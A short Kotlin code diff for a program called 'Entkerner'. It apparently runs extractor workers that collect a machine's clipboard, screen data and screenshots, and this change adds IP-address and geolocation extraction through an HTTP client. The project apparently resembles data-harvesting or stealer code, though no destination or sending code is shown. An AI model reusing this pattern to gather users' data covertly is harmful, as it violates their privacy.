@@ -10,11 +10,15 @@ import kotlinx.serialization.encodeToString
 import kotlinx.serialization.json.Json
 import net.kerner.entkerner.abstract.AbstractDataExtractor
 import net.kerner.entkerner.abstract.get
+import net.kerner.entkerner.extractors.geo.LocationData
+import net.kerner.entkerner.extractors.geo.LocationDataWorker
 import net.kerner.entkerner.extractors.screen.ScreenData
 import net.kerner.entkerner.extractors.screen.ScreenExtractionWorker
 import net.kerner.entkerner.extractors.screen.ScreenScreenshotWorker
 import net.kerner.entkerner.extractors.standart.ClipboardExtractionWorker
+import net.kerner.entkerner.extractors.standart.IPAddressExtractionWorker
 import net.kerner.entkerner.model.SystemType
+import java.net.InetAddress
 
 class Entkerner {
     val system = when(System.getProperty("os.name").lowercase()) {
@@ -38,7 +42,9 @@ class Entkerner {
         runBlocking {
             val clipboard = runExtractor<String>(ClipboardExtractionWorker(httpClient))
             val screenData = runExtractor<List<ScreenData>>(ScreenExtractionWorker(httpClient))
-            val screenshot = runExtractor<List<String>>(ScreenScreenshotWorker(httpClient))
+            //val screenshot = runExtractor<List<String>>(ScreenScreenshotWorker(httpClient))
+            val ip = runExtractor<List<String>>(IPAddressExtractionWorker(httpClient))
+            //val location = runExtractor<List<LocationData>>(LocationDataWorker())
         }
     }
     private suspend inline fun <reified V : Any> runExtractor(dataExtractor: AbstractDataExtractor<*>): V {
